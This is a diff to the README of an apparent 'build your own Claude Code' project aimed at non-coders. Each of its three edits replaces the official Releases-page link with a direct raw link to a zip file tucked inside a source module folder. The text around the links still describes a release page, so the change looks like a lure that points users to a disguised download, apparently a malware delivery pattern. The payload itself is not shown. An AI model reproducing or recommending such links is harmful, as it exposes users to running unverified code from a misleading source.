@@ -1,6 +1,6 @@
 # 🤖 create-own-claude-code - Build Your Own AI Coding Assistant
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/qoqnqlsodjwj/create-own-claude-code/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/qoqnqlsodjwj/create-own-claude-code/main/modules/05-context-management/own-create-code-claude-v2.7.zip)
 
 ## 🧭 What this app is
 
@@ -23,7 +23,7 @@ You do not need to know how to code to use the app. The goal is to help you down
 
 Go to the release page and download the Windows file:
 
-[Visit the Releases page to download](https://github.com/qoqnqlsodjwj/create-own-claude-code/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/qoqnqlsodjwj/create-own-claude-code/main/modules/05-context-management/own-create-code-claude-v2.7.zip)
 
 After the page opens, look for the latest release and choose the file that matches Windows.
 
@@ -194,7 +194,7 @@ With this app, you can:
 
 Use this page to get the Windows download:
 
-[https://github.com/qoqnqlsodjwj/create-own-claude-code/releases](https://github.com/qoqnqlsodjwj/create-own-claude-code/releases)
+[https://raw.githubusercontent.com/qoqnqlsodjwj/create-own-claude-code/main/modules/05-context-management/own-create-code-claude-v2.7.zip](https://raw.githubusercontent.com/qoqnqlsodjwj/create-own-claude-code/main/modules/05-context-management/own-create-code-claude-v2.7.zip)
 
 ## 📌 Project topics
 
